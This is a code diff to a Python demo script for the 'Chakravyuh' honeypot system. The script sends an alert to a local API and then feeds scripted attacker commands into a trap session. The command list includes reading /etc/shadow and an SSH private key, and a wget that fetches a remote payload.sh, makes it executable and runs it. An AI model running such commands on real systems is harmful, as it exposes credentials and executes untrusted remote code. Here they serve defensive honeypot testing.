@@ -1,56 +1,103 @@
 """
-Simulates trap_controller.py emitting attacker events to Kafka.
-Run this AFTER the API server is already running.
-pip install aiokafka
+Simulates the complete end-to-end Chakravyuh data flow for a presentation.
+
+**Role:** Acts as both the initial trigger (ML detector) and the trapped attacker.
+
+**Flow:**
+1.  Sends an initial "anomaly detected" alert to the main API server.
+2.  The API server receives the alert and deploys a trap container, returning a session ID.
+3.  This script then uses the session ID to send a series of fake attacker commands
+    to the API, simulating an attacker interacting with the honeypot.
+4.  The API, via the TrapController, logs these commands, gets responses from an LLM,
+    extracts TTPs, and streams telemetry to Kafka.
+5.  The API's Kafka consumer picks up the telemetry and broadcasts it to the dashboard.
+6.  Finally, the script ends the session, triggering the teardown and reporting process.
+
+**Prerequisites:**
+  - Run the main API server first: `uvicorn backend.api.main:app --reload --port 8000`
+  - Ensure Kafka and Ollama are running.
+
+**Run:**
+    python backend/simulate_attack.py
 """
-import asyncio, json
+import asyncio
+import json
+import requests
+import time
 from datetime import datetime, timezone
-from aiokafka import AIOKafkaProducer
 
-KAFKA_BROKER = "localhost:9092"
-KAFKA_TOPIC  = "chakravyuh.trap.telemetry"
+API_URL = "http://localhost:8000/api/v1"
 
-FAKE_SESSION = [
-    {"event_type": "session_start", "severity": "critical", "anomaly_score": 0.91,
-     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
-     "session_id": "trap-demo-01", "ttps": [], "command": ""},
+# This represents the initial alert from the ML detector
+INITIAL_ALERT = {
+    "flow_id": "185.220.101.47-10.0.5.12",
+    "anomaly_score": 0.91,
+    "threshold": 0.85,
+    "severity": "critical",
+    "attacker_ip": "185.220.101.47",
+    "timestamp": datetime.now(timezone.utc).isoformat()
+}
 
-    {"event_type": "command", "severity": "high", "anomaly_score": 0.91,
-     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
-     "session_id": "trap-demo-01", "command": "whoami",
-     "ttps": [{"id": "T1033", "name": "System Owner/User Discovery"}]},
-
-    {"event_type": "command", "severity": "critical", "anomaly_score": 0.97,
-     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
-     "session_id": "trap-demo-01", "command": "cat /etc/shadow",
-     "ttps": [{"id": "T1003.008", "name": "/etc/passwd and /etc/shadow"}]},
-
-    {"event_type": "command", "severity": "critical", "anomaly_score": 0.99,
-     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
-     "session_id": "trap-demo-01", "command": "wget http://185.x.x.x/payload.sh",
-     "ttps": [{"id": "T1105", "name": "Ingress Tool Transfer"}]},
-
-    {"event_type": "session_end", "severity": "critical", "anomaly_score": 0.99,
-     "attacker_ip": "185.220.101.47", "institution_type": "hospital",
-     "session_id": "trap-demo-01", "ttps": [], "command": "",
-     "total_commands": 3},
+# These are the commands the "attacker" will run inside the honeypot
+ATTACKER_COMMANDS = [
+    "whoami",
+    "uname -a",
+    "ps aux",
+    "cat /etc/passwd",
+    "cat /etc/shadow",
+    "ls -la /home/his_admin/",
+    "cat /home/his_admin/.ssh/id_rsa",
+    "wget http://185.220.101.47/payload.sh -O /tmp/p.sh",
+    "chmod +x /tmp/p.sh",
+    "/tmp/p.sh"
 ]
 
-async def main():
-    producer = AIOKafkaProducer(bootstrap_servers=KAFKA_BROKER)
-    await producer.start()
-    print(f"Connected to Kafka. Sending {len(FAKE_SESSION)} events to '{KAFKA_TOPIC}'...\n")
+def main():
+    """Runs the full simulation."""
+    session_id = None
     try:
-        for event in FAKE_SESSION:
-            event["timestamp"] = datetime.now(timezone.utc).isoformat()
-            await producer.send_and_wait(
-                KAFKA_TOPIC,
-                json.dumps(event).encode("utf-8")
-            )
-            print(f"  Sent → event_type={event['event_type']:15s}  command={event.get('command', '—')}")
-            await asyncio.sleep(2)  # 2 second gap between commands = realistic pacing
-    finally:
-        await producer.stop()
-    print("\nDone. Check your WebSocket terminal — you should have received 5 alerts.")
+        # 1. Trigger the initial alert
+        print("STEP 1: ML Detector sends alert to API...")
+        resp = requests.post(f"{API_URL}/alert", json=INITIAL_ALERT, timeout=10)
+        resp.raise_for_status()
+        data = resp.json()
+        session_id = data.get("session_id")
+        if not session_id:
+            raise ValueError("API did not return a session_id")
+        print(f"  ✅  SUCCESS: Trap session created. Session ID: {session_id}\n")
+        time.sleep(2)
 
-asyncio.run(main())
+        # 2. Simulate attacker commands
+        print("STEP 2: Attacker begins interacting with the honeypot...")
+        for i, command in enumerate(ATTACKER_COMMANDS):
+            print(f"  > Sending command {i+1}/{len(ATTACKER_COMMANDS)}: '{command}'")
+            cmd_payload = {"command": command}
+            resp = requests.post(f"{API_URL}/session/{session_id}/command", json=cmd_payload, timeout=20)
+            resp.raise_for_status()
+            print("    - Command logged by API.")
+            time.sleep(random.uniform(2, 5)) # Realistic delay between commands
+        print("  ✅  SUCCESS: All attacker commands sent.\n")
+        time.sleep(2)
+
+    except requests.exceptions.RequestException as e:
+        print(f"\n❌ ERROR: Could not connect to the API at {API_URL}.")
+        print("   Please ensure the FastAPI server is running: uvicorn backend.api.main:app --reload --port 8000")
+        print(f"   Details: {e}")
+    except Exception as e:
+        print(f"\n❌ An unexpected error occurred: {e}")
+    finally:
+        # 3. End the session
+        if session_id:
+            print("STEP 3: Attacker logs out, ending the session...")
+            try:
+                resp = requests.post(f"{API_URL}/session/{session_id}/end", timeout=10)
+                resp.raise_for_status()
+                print("  ✅  SUCCESS: Session terminated and report generated.")
+            except requests.exceptions.RequestException as e:
+                print(f"  ❌ ERROR: Failed to end session {session_id}. Details: {e}")
+
+    print("\nSimulation complete. Check the dashboard for live updates.")
+
+if __name__ == "__main__":
+    import random
+    main()
